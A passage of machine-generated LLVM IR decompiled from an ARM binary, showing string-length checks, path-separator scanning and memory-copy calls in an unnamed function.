  %v2_a6a0 = load i32, i32* @r8, align 4
  %v3_a6a0 = add i32 %v2_a6a0, -1452
  %v4_a6a0 = inttoptr i32 %v3_a6a0 to i8*
  store i8 %v1_a6a0, i8* %v4_a6a0, align 1
  br label %dec_label_pc_9590

dec_label_pc_a6a8:                                ; preds = %dec_label_pc_a1b0
  %v0_a6a8 = load i32, i32* %fp.global-to-local, align 4
  %v1_a6a8 = inttoptr i32 %v0_a6a8 to i32*
  %v2_a6a8 = load i32, i32* %v1_a6a8, align 4
  store i32 %v2_a6a8, i32* %r3.global-to-local, align 4
  %v1_a6ac = add i32 %v2_a6a8, -11
  %v2_a6ac = icmp ugt i32 %v2_a6a8, 10
  store i1 %v2_a6ac, i1* %cpsr_c.global-to-local, align 1
  %v3_a6ac = sub i32 10, %v2_a6a8
  %v4_a6ac = and i32 %v3_a6ac, %v2_a6a8
  %v5_a6ac = icmp slt i32 %v4_a6ac, 0
  store i1 %v5_a6ac, i1* %cpsr_v.global-to-local, align 1
  %v6_a6ac = icmp slt i32 %v1_a6ac, 0
  store i1 %v6_a6ac, i1* %cpsr_n.global-to-local, align 1
  %v7_a6ac = icmp eq i32 %v2_a6a8, 11
  store i1 %v7_a6ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6ac, label %dec_label_pc_9590, label %dec_label_pc_a68c

dec_label_pc_a6b8:                                ; preds = %bb230
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_a6c4 = load i32, i32* @r5, align 4
  %v1_a6c4 = add i32 %v0_a6c4, 4
  %v2_a6c4 = inttoptr i32 %v1_a6c4 to i8*
  %v3_a6c4 = load i8, i8* %v2_a6c4, align 1
  %v4_a6c4 = zext i8 %v3_a6c4 to i32
  store i32 %v4_a6c4, i32* %r3.global-to-local, align 4
  %v2_a6c8 = icmp ugt i8 %v3_a6c4, 114
  store i1 %v2_a6c8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a6c8 = icmp ult i8 %v3_a6c4, 115
  store i1 %v6_a6c8, i1* %cpsr_n.global-to-local, align 1
  %v7_a6c8 = icmp eq i8 %v3_a6c4, 115
  store i1 %v7_a6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6c8, label %bb235, label %.thread63

bb235:                                            ; preds = %dec_label_pc_a6b8
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread63

.thread63:                                        ; preds = %dec_label_pc_a6b8, %bb235
  %v3_a6d8 = phi i32 [ 7, %dec_label_pc_a6b8 ], [ 8, %bb235 ]
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  store i32 %v0_a6c4, i32* %r0.global-to-local, align 4
  %v1_a6e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_a6e0 = sub i32 %v1_a6e0, %v3_a6d8
  store i32 %v2_a6e0, i32* %r2.global-to-local, align 4
  %v2_a6e4 = add i32 %v3_a6d8, %v0_a6c4
  store i32 %v2_a6e4, i32* %r1.global-to-local, align 4
  %v3_a6e8 = call i32 @_memmove(i32 %v0_a6c4, i32 %v2_a6e4, i32 %v2_a6e0)
  store i32 %v3_a6e8, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v0_a6f0 = load i32, i32* @r7, align 4
  store i32 %v0_a6f0, i32* %stack_var_-40, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  %v1_a6f8 = load i32, i32* @r4, align 4
  %v2_a6f8 = add i32 %v1_a6f8, %v2_8fd8
  %v3_a6f8 = inttoptr i32 %v2_a6f8 to i8*
  %v4_a6f8 = load i8, i8* %v3_a6f8, align 1
  %v6_a6f8 = zext i8 %v4_a6f8 to i32
  store i32 %v6_a6f8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a6fc = icmp eq i8 %v4_a6f8, 0
  store i1 %v2_a6fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a6fc, label %dec_label_pc_a740, label %dec_label_pc_a704

dec_label_pc_a704:                                ; preds = %.thread63
  %v2_a704 = icmp ugt i8 %v4_a6f8, 46
  store i1 %v2_a704, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a704 = icmp ult i8 %v4_a6f8, 47
  store i1 %v6_a704, i1* %cpsr_n.global-to-local, align 1
  %v7_a704 = icmp eq i8 %v4_a6f8, 47
  store i1 %v7_a704, i1* %cpsr_z.global-to-local, align 1
  %v1_a708 = load i32, i32* @r5, align 4
  br i1 %v7_a704, label %bb236, label %dec_label_pc_a710

bb236:                                            ; preds = %dec_label_pc_a704
  store i32 %v1_a708, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a8a0

dec_label_pc_a710:                                ; preds = %dec_label_pc_a704
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a720

dec_label_pc_a718:                                ; preds = %dec_label_pc_a720
  %v2_a718 = icmp ugt i8 %v4_a72c, 46
  store i1 %v2_a718, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a718 = icmp ult i8 %v4_a72c, 47
  store i1 %v6_a718, i1* %cpsr_n.global-to-local, align 1
  %v7_a718 = icmp eq i8 %v4_a72c, 47
  store i1 %v7_a718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a718, label %dec_label_pc_a8a0, label %dec_label_pc_a720

dec_label_pc_a720:                                ; preds = %dec_label_pc_a718, %dec_label_pc_a710
  %v0_a734 = phi i32 [ %v1_a734, %dec_label_pc_a718 ], [ 1, %dec_label_pc_a710 ]
  store i32 %v0_a734, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  store i32 %v0_a734, i32* %stack_var_-40, align 4
  %v2_a72c = add i32 %v0_a734, %v1_a708
  %v3_a72c = inttoptr i32 %v2_a72c to i8*
  %v4_a72c = load i8, i8* %v3_a72c, align 1
  %v6_a72c = zext i8 %v4_a72c to i32
  store i32 %v6_a72c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a730 = icmp eq i8 %v4_a72c, 0
  store i1 %v2_a730, i1* %cpsr_z.global-to-local, align 1
  %v1_a734 = add i32 %v0_a734, 1
  store i32 %v1_a734, i32* %r3.global-to-local, align 4
  store i32 %v2_a72c, i32* %r1.global-to-local, align 4
  br i1 %v2_a730, label %dec_label_pc_a740, label %dec_label_pc_a718

dec_label_pc_a740:                                ; preds = %dec_label_pc_a720, %.thread63, %dec_label_pc_a8a0
  %v0_a740 = load i32, i32* @r5, align 4
  store i32 %v0_a740, i32* %r0.global-to-local, align 4
  %v1_a744 = inttoptr i32 %v0_a740 to i8*
  %v2_a744 = call i32 @function_13a54(i8* %v1_a744)
  store i32 %v2_a744, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a748 = icmp slt i32 %v2_a744, 0
  store i1 %v1_a748, i1* %cpsr_n.global-to-local, align 1
  %v2_a748 = icmp eq i32 %v2_a744, 0
  store i1 %v2_a748, i1* %cpsr_z.global-to-local, align 1
  %tmp237 = icmp slt i32 %v2_a744, 1
  br i1 %tmp237, label %dec_label_pc_a76c, label %dec_label_pc_a750

dec_label_pc_a750:                                ; preds = %dec_label_pc_a740
  %v0_a750 = load i32, i32* @r5, align 4
  store i32 %v0_a750, i32* %r0.global-to-local, align 4
  %v1_a754 = inttoptr i32 %v0_a750 to i8*
  %v2_a754 = call i32 @function_13a54(i8* %v1_a754)
  store i32 %v2_a754, i32* %r0.global-to-local, align 4
  %v1_a758 = add i32 %v2_a754, -127
  %v2_a758 = icmp ugt i32 %v2_a754, 126
  store i1 %v2_a758, i1* %cpsr_c.global-to-local, align 1
  %v3_a758 = sub i32 126, %v2_a754
  %v4_a758 = and i32 %v3_a758, %v2_a754
  %v5_a758 = icmp slt i32 %v4_a758, 0
  store i1 %v5_a758, i1* %cpsr_v.global-to-local, align 1
  %v6_a758 = icmp slt i32 %v1_a758, 0
  store i1 %v6_a758, i1* %cpsr_n.global-to-local, align 1
  %v7_a758 = icmp eq i32 %v2_a754, 127
  store i1 %v7_a758, i1* %cpsr_z.global-to-local, align 1
  %v7_a75c = icmp sgt i32 %v2_a754, 127
  br i1 %v7_a75c, label %.thread66, label %bb238

bb238:                                            ; preds = %dec_label_pc_a750
  %v8_a75c = load i32, i32* %sb.global-to-local, align 4
  %v9_a760 = add i32 %v8_a75c, 789
  store i32 %v9_a760, i32* %r0.global-to-local, align 4
  %v8_a764 = load i32, i32* @r5, align 4
  store i32 %v8_a764, i32* %r1.global-to-local, align 4
  br label %.thread66

.thread66:                                        ; preds = %dec_label_pc_a750, %bb238
  store i32 42860, i32* %lr.global-to-local, align 4
  %v3_a768 = xor i1 %v6_a758, %v5_a758
  %v4_a768 = or i1 %v7_a758, %v3_a768
  call void @__pseudo_cond_branch(i1 %v4_a768, i32 ptrtoint (i32* @global_var_13a7c.104 to i32))
  br label %dec_label_pc_a76c

dec_label_pc_a76c:                                ; preds = %dec_label_pc_a740, %.thread66
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_a770 = load i32, i32* %stack_var_-40, align 4
  %v0_a774 = load i32, i32* @r5, align 4
  %v2_a774 = add i32 %v3_a770, 1
  %v1_a778 = add i32 %v2_a774, %v0_a774
  store i32 %v1_a778, i32* %r0.global-to-local, align 4
  %v1_a77c = inttoptr i32 %v1_a778 to i8*
  %v2_a77c = call i32 @function_13a54(i8* %v1_a77c)
  store i32 %v2_a77c, i32* %r0.global-to-local, align 4
  %v1_a780 = add i32 %v2_a77c, -255
  %v2_a780 = icmp ugt i32 %v2_a77c, 254
  store i1 %v2_a780, i1* %cpsr_c.global-to-local, align 1
  %v3_a780 = sub i32 254, %v2_a77c
  %v4_a780 = and i32 %v3_a780, %v2_a77c
  %v5_a780 = icmp slt i32 %v4_a780, 0
  store i1 %v5_a780, i1* %cpsr_v.global-to-local, align 1
  %v6_a780 = icmp slt i32 %v1_a780, 0
  store i1 %v6_a780, i1* %cpsr_n.global-to-local, align 1
  %v7_a780 = icmp eq i32 %v2_a77c, 255
  store i1 %v7_a780, i1* %cpsr_z.global-to-local, align 1
  %v8_a784 = icmp sgt i32 %v2_a77c, 255
  br i1 %v8_a784, label %dec_label_pc_a158, label %dec_label_pc_a788

dec_label_pc_a788:                                ; preds = %dec_label_pc_a76c
  %v0_a788 = load i32, i32* %sb.global-to-local, align 4
  %v1_a78c = add i32 %v0_a788, 533
  store i32 %v1_a78c, i32* @r4, align 4
  store i32 %v1_a78c, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a798 = call i32 @function_13af4(i32 %v1_a78c, i32 255)
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_a7a0 = load i32, i32* %stack_var_-40, align 4
  %v0_a7a4 = load i32, i32* @r5, align 4
  %v2_a7a4 = add i32 %v3_a7a0, 1
  %v1_a7a8 = add i32 %v2_a7a4, %v0_a7a4
  store i32 %v1_a7a8, i32* %r0.global-to-local, align 4
  %v1_a7ac = inttoptr i32 %v1_a7a8 to i8*
  %v2_a7ac = call i32 @function_13a54(i8* %v1_a7ac)
  store i32 %v2_a7ac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a7b0 = icmp slt i32 %v2_a7ac, 0
  store i1 %v1_a7b0, i1* %cpsr_n.global-to-local, align 1
  %v2_a7b0 = icmp eq i32 %v2_a7ac, 0
  store i1 %v2_a7b0, i1* %cpsr_z.global-to-local, align 1
  %tmp239 = icmp slt i32 %v2_a7ac, 1
  br i1 %tmp239, label %dec_label_pc_a158, label %dec_label_pc_a7b8

dec_label_pc_a7b8:                                ; preds = %dec_label_pc_a788
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v3_a7bc = load i32, i32* %stack_var_-40, align 4
  %v0_a7c0 = load i32, i32* @r5, align 4
  %v0_a7c4 = load i32, i32* @r4, align 4
  store i32 %v0_a7c4, i32* @r0, align 4
  %v2_a7c0 = add i32 %v3_a7bc, 1
  %v1_a7c8 = add i32 %v2_a7c0, %v0_a7c0
  store i32 %v1_a7c8, i32* %r1.global-to-local, align 4
  %v2_a7cc = inttoptr i32 %v0_a7c4 to i8*
  %v3_a7cc = call i32 @function_13a7c(i8* %v2_a7cc, i32 %v1_a7c8)
  store i32 %v3_a7cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a158

dec_label_pc_a7d4:                                ; preds = %dec_label_pc_9b28
  %v0_a7d4 = load i32, i32* @r8, align 4
  %v1_a7d4 = add i32 %v0_a7d4, -1456
  %v2_a7d4 = inttoptr i32 %v1_a7d4 to i32*
  %v3_a7d4 = load i32, i32* %v2_a7d4, align 4
  store i32 %v3_a7d4, i32* %r0.global-to-local, align 4
  %v1_a7d8 = call i32 @close(i32 %v3_a7d4)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_a7e4 = load i32, i32* @r8, align 4
  %v2_a7e4 = add i32 %v1_a7e4, -1456
  %v3_a7e4 = inttoptr i32 %v2_a7e4 to i32*
  store i32 -1, i32* %v3_a7e4, align 4
  %v0_a7e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7e8 = trunc i32 %v0_a7e8 to i8
  %v2_a7e8 = load i32, i32* @r8, align 4
  %v3_a7e8 = add i32 %v2_a7e8, -1452
  %v4_a7e8 = inttoptr i32 %v3_a7e8 to i8*
  store i8 %v1_a7e8, i8* %v4_a7e8, align 1
  br label %dec_label_pc_9590

dec_label_pc_a7f0:                                ; preds = %dec_label_pc_a3a8
  %v0_a7f0 = load i32, i32* @r8, align 4
  %v1_a7f0 = add i32 %v0_a7f0, -1452
  %v2_a7f0 = inttoptr i32 %v1_a7f0 to i8*
  %v3_a7f0 = load i8, i8* %v2_a7f0, align 1
  %v4_a7f0 = zext i8 %v3_a7f0 to i32
  store i32 %v4_a7f0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a7f4 = icmp eq i8 %v3_a7f0, 0
  store i1 %v2_a7f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a7f4, label %dec_label_pc_9590, label %dec_label_pc_a158

dec_label_pc_a800:                                ; preds = %dec_label_pc_a618
  %v0_a800 = load i32, i32* @r4, align 4
  store i32 %v0_a800, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_143b4.76 to i32), i32* %r1.global-to-local, align 4
  %v3_a808 = inttoptr i32 %v0_a800 to i8*
  %v4_a808 = call i32 @function_13e34(i8* %v3_a808, i32 ptrtoint ([4 x i8]* @global_var_143b4.76 to i32))
  store i32 %v4_a808, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a80c = icmp slt i32 %v4_a808, 0
  store i1 %v1_a80c, i1* %cpsr_n.global-to-local, align 1
  %v2_a80c = icmp eq i32 %v4_a808, 0
  store i1 %v2_a80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a80c, label %bb240, label %dec_label_pc_a64c

bb240:                                            ; preds = %dec_label_pc_a800
  %v0_a814 = load i32, i32* %fp.global-to-local, align 4
  %v1_a814 = load i32, i32* @r5, align 4
  %v2_a814 = sub i32 %v0_a814, %v1_a814
  %v3_a814 = icmp uge i32 %v0_a814, %v1_a814
  store i1 %v3_a814, i1* %cpsr_c.global-to-local, align 1
  %v4_a814 = xor i32 %v1_a814, %v0_a814
  %v5_a814 = xor i32 %v2_a814, %v0_a814
  %v6_a814 = and i32 %v5_a814, %v4_a814
  %v7_a814 = icmp slt i32 %v6_a814, 0
  store i1 %v7_a814, i1* %cpsr_v.global-to-local, align 1
  %v8_a814 = icmp slt i32 %v2_a814, 0
  store i1 %v8_a814, i1* %cpsr_n.global-to-local, align 1
  %v9_a814 = icmp eq i32 %v0_a814, %v1_a814
  store i1 %v9_a814, i1* %cpsr_z.global-to-local, align 1
  %v7_a818 = icmp sgt i32 %v0_a814, %v1_a814
  %. = select i1 %v7_a818, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_a820 = trunc i32 %. to i8
  %v10_a820 = load i32, i32* @r8, align 4
  %v11_a820 = add i32 %v10_a820, -1452
  %v12_a820 = inttoptr i32 %v11_a820 to i8*
  store i8 %v9_a820, i8* %v12_a820, align 1
  br label %dec_label_pc_a654

dec_label_pc_a82c:                                ; preds = %dec_label_pc_a2a0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v0_a834 = load i32, i32* @r8, align 4
  %v1_a834 = add i32 %v0_a834, 656
  %v2_a834 = inttoptr i32 %v1_a834 to i32*
  %v3_a834 = load i32, i32* %v2_a834, align 4
  store i32 %v3_a834, i32* @r4, align 4
  %v3_a838 = call i32 @function_13044(i32 36, i32* null)
  %v0_a83c = load i32, i32* @r4, align 4
  store i32 %v0_a83c, i32* %r1.global-to-local, align 4
  store i32 %v3_a838, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_a848 = load i32, i32* @r7, align 4
  store i32 %v0_a848, i32* %r0.global-to-local, align 4
  %v4_a84c = call i32 @function_13b18(i32 %v0_a848, i32 %v0_a83c, i32 %v3_a838, i32 11)
  store i32 %v4_a84c, i32* %r0.global-to-local, align 4
  %v0_a850 = load i32, i32* @r8, align 4
  %v1_a850 = add i32 %v0_a850, 656
  %v2_a850 = inttoptr i32 %v1_a850 to i32*
  %v3_a850 = load i32, i32* %v2_a850, align 4
  %v0_a854 = load i32, i32* @r7, align 4
  %v2_a854 = add i32 %v0_a854, %v4_a84c
  store i32 %v2_a854, i32* @r5, align 4
  store i32 %v4_a84c, i32* @r4, align 4
  %v2_a85c = sub i32 %v3_a850, %v4_a84c
  store i32 %v2_a85c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143f0.106 to i32), i32* %r2.global-to-local, align 4
  %v0_a864 = load i32, i32* @sl, align 4
  store i32 %v0_a864, i32* %r3.global-to-local, align 4
  store i32 %v2_a854, i32* %r0.global-to-local, align 4
  %v4_a86c = call i32 @function_13b18(i32 %v2_a854, i32 %v2_a85c, i32 ptrtoint (i32* @global_var_143f0.106 to i32), i32 %v0_a864)
  store i32 %v4_a86c, i32* %r0.global-to-local, align 4
  %v0_a870 = load i32, i32* @r8, align 4
  %v1_a870 = add i32 %v0_a870, 12
  %v2_a870 = inttoptr i32 %v1_a870 to i32*
  %v3_a870 = load i32, i32* %v2_a870, align 4
  store i32 %v3_a870, i32* %r3.global-to-local, align 4
  %v0_a874 = load i32, i32* @r4, align 4
  %v2_a874 = add i32 %v0_a874, %v4_a86c
  store i32 %v2_a874, i32* %r6.global-to-local, align 4
  %v1_a878 = load i32, i32* %sb.global-to-local, align 4
  %v2_a878 = add i32 %v1_a878, %v2_a874
  store i32 %v2_a878, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v1_a880 = add i32 %v3_a870, -4
  %v2_a880 = icmp ugt i32 %v3_a870, 3
  store i1 %v2_a880, i1* %cpsr_c.global-to-local, align 1
  %v3_a880 = sub i32 3, %v3_a870
  %v4_a880 = and i32 %v3_a880, %v3_a870
  %v5_a880 = icmp slt i32 %v4_a880, 0
  store i1 %v5_a880, i1* %cpsr_v.global-to-local, align 1
  %v6_a880 = icmp slt i32 %v1_a880, 0
  store i1 %v6_a880, i1* %cpsr_n.global-to-local, align 1
  %v7_a880 = icmp eq i32 %v3_a870, 4
  store i1 %v7_a880, i1* %cpsr_z.global-to-local, align 1
  %v3_a884 = add i32 %v2_a878, 2115
  %v4_a884 = inttoptr i32 %v3_a884 to i8*
  store i8 0, i8* %v4_a884, align 1
  %v7_a888 = icmp sgt i32 %v3_a870, 4
  br i1 %v7_a888, label %dec_label_pc_a88c, label %dec_label_pc_a914

dec_label_pc_a88c:                                ; preds = %dec_label_pc_a82c, %dec_label_pc_a914, %dec_label_pc_a924
  store i32 -1, i32* %r6.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_a894 = load i32, i32* @r8, align 4
  %v2_a894 = add i32 %v1_a894, 8
  %v3_a894 = inttoptr i32 %v2_a894 to i32*
  store i32 -1, i32* %v3_a894, align 4
  %v0_a898 = load i32, i32* %r3.global-to-local, align 4
  %v1_a898 = trunc i32 %v0_a898 to i8
  %v2_a898 = load i32, i32* @r8, align 4
  %v3_a898 = add i32 %v2_a898, -1452
  %v4_a898 = inttoptr i32 %v3_a898 to i8*
  store i8 %v1_a898, i8* %v4_a898, align 1
  br label %dec_label_pc_9590

dec_label_pc_a8a0:                                ; preds = %dec_label_pc_a718, %bb236
  %v2_a8a4 = phi i32 [ %v1_a708, %bb236 ], [ %v2_a72c, %dec_label_pc_a718 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a8a4 = inttoptr i32 %v2_a8a4 to i8*
  store i8 0, i8* %v3_a8a4, align 1
  br label %dec_label_pc_a740

dec_label_pc_a8ac:                                ; preds = %dec_label_pc_a148
  %v0_a8ac = load i32, i32* %sb.global-to-local, align 4
  %v1_a8b0 = add i32 %v0_a8ac, 533
  store i32 %v1_a8b0, i32* @r4, align 4
  store i32 %v1_a8b0, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a8bc = call i32 @function_13af4(i32 %v1_a8b0, i32 255)
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_a8c4 = load i32, i32* %stack_var_-40, align 4
  %v0_a8c8 = load i32, i32* @r5, align 4
  %v2_a8c8 = add i32 %v3_a8c4, 1
  %v1_a8cc = add i32 %v2_a8c8, %v0_a8c8
  store i32 %v1_a8cc, i32* %r0.global-to-local, align 4
  %v1_a8d0 = inttoptr i32 %v1_a8cc to i8*
  %v2_a8d0 = call i32 @function_13a54(i8* %v1_a8d0)
  store i32 %v2_a8d0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a8d4 = icmp slt i32 %v2_a8d0, 0
  store i1 %v1_a8d4, i1* %cpsr_n.global-to-local, align 1
  %v2_a8d4 = icmp eq i32 %v2_a8d0, 0
  store i1 %v2_a8d4, i1* %cpsr_z.global-to-local, align 1
  %tmp241 = icmp slt i32 %v2_a8d0, 1
  br i1 %tmp241, label %dec_label_pc_a158, label %dec_label_pc_a8dc

dec_label_pc_a8dc:                                ; preds = %dec_label_pc_a8ac
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v3_a8e0 = load i32, i32* %stack_var_-40, align 4
  %v0_a8e4 = load i32, i32* @r5, align 4
  %v2_a8e4 = add i32 %v3_a8e0, 1
  %v1_a8e8 = add i32 %v2_a8e4, %v0_a8e4
  store i32 %v1_a8e8, i32* %r0.global-to-local, align 4
  %v1_a8ec = inttoptr i32 %v1_a8e8 to i8*
  %v2_a8ec = call i32 @function_13a54(i8* %v1_a8ec)
  store i32 %v2_a8ec, i32* %r0.global-to-local, align 4
  %v1_a8f0 = add i32 %v2_a8ec, -255
  %v2_a8f0 = icmp ugt i32 %v2_a8ec, 254
  store i1 %v2_a8f0, i1* %cpsr_c.global-to-local, align 1
  %v3_a8f0 = sub i32 254, %v2_a8ec
  %v4_a8f0 = and i32 %v3_a8f0, %v2_a8ec
  %v5_a8f0 = icmp slt i32 %v4_a8f0, 0
  store i1 %v5_a8f0, i1* %cpsr_v.global-to-local, align 1
  %v6_a8f0 = icmp slt i32 %v1_a8f0, 0
  store i1 %v6_a8f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a8f0 = icmp eq i32 %v2_a8ec, 255
  store i1 %v7_a8f0, i1* %cpsr_z.global-to-local, align 1
  %v8_a8f4 = icmp sgt i32 %v2_a8ec, 255
  br i1 %v8_a8f4, label %dec_label_pc_a158, label %dec_label_pc_a8f8

dec_label_pc_a8f8:                                ; preds = %dec_label_pc_a8dc
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_a8fc = load i32, i32* %stack_var_-40, align 4
  %v0_a900 = load i32, i32* @r5, align 4
  %v0_a904 = load i32, i32* @r4, align 4
  store i32 %v0_a904, i32* @r0, align 4
  %v2_a900 = add i32 %v3_a8fc, 1
  %v1_a908 = add i32 %v2_a900, %v0_a900
  store i32 %v1_a908, i32* %r1.global-to-local, align 4
  %v2_a90c = inttoptr i32 %v0_a904 to i8*
  %v3_a90c = call i32 @function_13a7c(i8* %v2_a90c, i32 %v1_a908)
  store i32 %v3_a90c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a158

dec_label_pc_a914:                                ; preds = %dec_label_pc_a82c
  %v0_a914 = load i32, i32* @r5, align 4
  store i32 %v0_a914, i32* %r0.global-to-local, align 4
  %v1_a918 = inttoptr i32 %v0_a914 to i8*
  %v2_a918 = call i32 @function_13a54(i8* %v1_a918)
  store i32 %v2_a918, i32* %r0.global-to-local, align 4
  %v1_a91c = add i32 %v2_a918, -127
  %v2_a91c = icmp ugt i32 %v2_a918, 126
  store i1 %v2_a91c, i1* %cpsr_c.global-to-local, align 1
  %v3_a91c = sub i32 126, %v2_a918
  %v4_a91c = and i32 %v3_a91c, %v2_a918
  %v5_a91c = icmp slt i32 %v4_a91c, 0
  store i1 %v5_a91c, i1* %cpsr_v.global-to-local, align 1
  %v6_a91c = icmp slt i32 %v1_a91c, 0
  store i1 %v6_a91c, i1* %cpsr_n.global-to-local, align 1
  %v7_a91c = icmp eq i32 %v2_a918, 127
  store i1 %v7_a91c, i1* %cpsr_z.global-to-local, align 1
  %v8_a920 = icmp sgt i32 %v2_a918, 127
  br i1 %v8_a920, label %dec_label_pc_a88c, label %dec_label_pc_a924

dec_label_pc_a924:                                ; preds = %dec_label_pc_a914
  %v0_a924 = load i32, i32* @r8, align 4
  %v1_a924 = add i32 %v0_a924, 12
  %v2_a924 = inttoptr i32 %v1_a924 to i32*
  %v3_a924 = load i32, i32* %v2_a924, align 4
  store i32 %v1_a168, i32* %r2.global-to-local, align 4
  %v1_a92c = and i32 %v3_a924, 33554432
  %v2_a92c = icmp ne i32 %v1_a92c, 0
  store i1 %v2_a92c, i1* %cpsr_c.global-to-local, align 1
  %v3_a92c = mul i32 %v3_a924, 128
  %v0_a930 = load i32, i32* @r5, align 4
  store i32 %v0_a930, i32* %r1.global-to-local, align 4
  %v2_a934 = add i32 %v3_a92c, %v1_a168
  store i32 %v2_a934, i32* @r0, align 4
  %v2_a938 = inttoptr i32 %v2_a934 to i8*
  %v3_a938 = call i32 @function_13a7c(i8* %v2_a938, i32 %v0_a930)
  store i32 %v3_a938, i32* %r0.global-to-local, align 4
  %v0_a93c = load i32, i32* @r8, align 4
  %v1_a93c = add i32 %v0_a93c, 12
  %v2_a93c = inttoptr i32 %v1_a93c to i32*
  %v3_a93c = load i32, i32* %v2_a93c, align 4
  store i32 %v1_a168, i32* %r3.global-to-local, align 4
  %v1_a944 = and i32 %v3_a93c, 33554432
  %v2_a944 = icmp ne i32 %v1_a944, 0
  store i1 %v2_a944, i1* %cpsr_c.global-to-local, align 1
  %v3_a944 = mul i32 %v3_a93c, 128
  %v2_a948 = add i32 %v3_a944, %v1_a168
  store i32 %v2_a948, i32* %r4.global-to-local, align 4
  store i32 %v2_a948, i32* %r0.global-to-local, align 4
  %v1_a950 = inttoptr i32 %v2_a948 to i8*
  %v2_a950 = call i32 @function_13a54(i8* %v1_a950)
  store i32 ptrtoint (i32* @global_var_143f4.108 to i32), i32* %r1.global-to-local, align 4
  %v2_a958 = add i32 %v2_a948, %v2_a950
  store i32 %v2_a958, i32* @r0, align 4
  %v2_a95c = inttoptr i32 %v2_a958 to i8*
  %v3_a95c = call i32 @function_13a7c(i8* %v2_a95c, i32 ptrtoint (i32* @global_var_143f4.108 to i32))
  store i32 %v3_a95c, i32* %r0.global-to-local, align 4
  %v0_a960 = load i32, i32* %r6.global-to-local, align 4
  %v1_a960 = add i32 %v0_a960, 3
  store i32 %v1_a960, i32* @r4, align 4
  %v0_a964 = load i32, i32* @r8, align 4
  %v1_a964 = add i32 %v0_a964, 656
  %v2_a964 = inttoptr i32 %v1_a964 to i32*
  %v3_a964 = load i32, i32* %v2_a964, align 4
  %v0_a968 = load i32, i32* @r7, align 4
  %v2_a968 = add i32 %v0_a968, %v1_a960
  store i32 %v2_a968, i32* %r6.global-to-local, align 4
  %v2_a96c = sub i32 %v3_a964, %v1_a960
  store i32 %v2_a96c, i32* %r1.global-to-local, align 4
  %v0_a970 = load i32, i32* @sl, align 4
  store i32 %v0_a970, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143f0.106 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a968, i32* %r0.global-to-local, align 4
